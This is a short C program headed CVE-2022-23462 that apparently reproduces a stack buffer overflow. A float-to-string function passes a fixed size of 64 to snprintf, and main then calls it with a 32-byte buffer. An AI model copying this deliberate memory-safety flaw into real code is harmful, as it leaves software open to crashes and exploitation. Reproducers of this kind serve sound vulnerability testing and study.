/*
 * CVE-2022-23462
 */

#include <stdio.h>
#include <stdlib.h>

#define IWNUMBUF_SIZE 70
#define NEWBUF_SIZE 32

void iwjson_ftoa(long double val, char *buf, size_t *out_len) {
  // If size of 'buf' is 32 which is less than 64, then will be buffer-overflow
  int len = snprintf(buf, 64, "%.8Lf", val);
  if (len <= 0) {
    buf[0] = '\0';
    *out_len = 0;
    return;
  }
  while (len > 0 && buf[len - 1] == '0') {
    buf[len - 1] = '\0';
    len--;
  }
  if ((len > 0) && (buf[len - 1] == '.')) {
    buf[len - 1] = '\0';
    len--;
  }
  *out_len = (size_t)len;
}

int main() {
  char buf[IWNUMBUF_SIZE];
  char new_buf[NEWBUF_SIZE];
  char *alias_to_buf = buf;
  size_t *out_len = malloc(sizeof(size_t));
  *out_len = 50;
  iwjson_ftoa(12345678912345678912345.1234, alias_to_buf, out_len);
  alias_to_buf = new_buf;
  iwjson_ftoa(12345678912345678912345.1234, alias_to_buf, out_len);
  free(out_len);
}
